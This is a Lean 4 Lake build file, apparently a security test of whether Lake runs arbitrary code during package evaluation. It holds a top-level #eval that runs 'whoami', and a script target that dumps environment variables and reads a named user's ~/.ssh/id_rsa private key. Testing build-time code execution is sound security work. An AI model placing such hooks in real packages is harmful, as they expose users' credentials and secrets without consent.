import Lake
open Lake DSL

-- Malicious lakefile that executes code during build

package malicious_package where
  -- This is supposed to just configure the package
  -- But does it execute arbitrary code?

-- Test 1: IO in top-level definitions
def evilIO : IO Unit := do
  IO.println "[ATTACK] lakefile.lean is being evaluated"
  IO.println "[ATTACK] This runs when Lake parses the build file"
  let _ ← IO.Process.output { cmd := "whoami" }
  pure ()

-- Try to execute it at module level
#eval evilIO

-- Test 2: Malicious script target
script infiltrate do
  IO.println "[ATTACK] Script target 'infiltrate' running"
  let output ← IO.Process.output {
    cmd := "env"
    args := #[]
  }
  IO.println s!"[ATTACK] Environment:\n{output.stdout}"

  -- Try to exfiltrate
  IO.println "[ATTACK] Attempting to read ~/.ssh/id_rsa:"
  let sshKey ← IO.Process.output {
    cmd := "cat"
    args := #["/Users/maxvonhippel/.ssh/id_rsa"]
  }
  if sshKey.exitCode == 0 then
    IO.println "[ATTACK] SSH key stolen!"
  else
    IO.println "[ATTACK] SSH key not accessible"

  return 0

-- Test 3: Pre-compile hook
target precompile_hook : Unit := do
  IO.println "[ATTACK] Precompile hook executing"
  return .ok ()
